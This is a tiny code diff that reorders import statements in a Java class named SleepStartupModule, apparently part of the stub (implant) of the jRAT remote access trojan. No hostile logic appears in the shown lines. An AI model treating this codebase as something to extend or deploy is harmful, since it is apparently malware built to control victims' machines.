@@ -2,10 +2,10 @@ package se.jrat.stub.modules.startup;
 
 import java.util.Map;
 
+import se.jrat.stub.Configuration;
+
 import com.redpois0n.oslib.DesktopEnvironment;
 import com.redpois0n.oslib.DesktopEnvironment.Family;
-
-import se.jrat.stub.Configuration;
 
 public class SleepStartupModule extends StartupModule {
 
